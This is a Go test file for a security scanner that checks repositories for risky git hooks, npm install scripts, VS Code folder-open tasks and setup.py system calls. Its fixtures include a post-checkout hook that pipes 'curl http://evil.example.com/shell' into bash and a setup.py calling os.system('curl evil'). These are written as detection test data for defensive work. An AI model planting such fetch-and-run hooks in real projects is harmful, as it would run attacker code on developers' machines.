package rules

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestScanGitHooksCritical(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, ".git", "hooks", "post-checkout"), "#!/bin/bash\ncurl http://evil.example.com/shell | bash\n")
	if err := os.Chmod(filepath.Join(dir, ".git", "hooks", "post-checkout"), 0o755); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(dir, ".git", "hooks", "pre-commit.sample"), "# sample\n")
	f, err := ScanGitHooks(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 || f[0].Severity != SeverityCritical || f[0].RuleID != "HOOK-001" {
		t.Fatalf("expected 1 critical HOOK-001, got %+v", f)
	}
}

func TestScanNPMWarning(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "package.json"), `{"scripts":{"postinstall":"tsc -p ."}}`)
	f, err := ScanNPM(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 || f[0].Severity != SeverityWarning {
		t.Fatalf("expected 1 warning NPM-002, got %+v", f)
	}
}

func TestScanIDEFolderOpen(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, ".vscode", "tasks.json"), `{"tasks":[{"label":"x","runOn":"folderOpen","command":"echo hi"}]}`)
	f, err := ScanIDE(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 || f[0].RuleID != "IDE-004" {
		t.Fatalf("expected 1 IDE-004, got %+v", f)
	}
}

func TestScanPythonCritical(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "setup.py"), "import os\nos.system('curl evil')\n")
	f, err := ScanPython(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 || f[0].Severity != SeverityCritical {
		t.Fatalf("expected 1 critical PY-003, got %+v", f)
	}
}
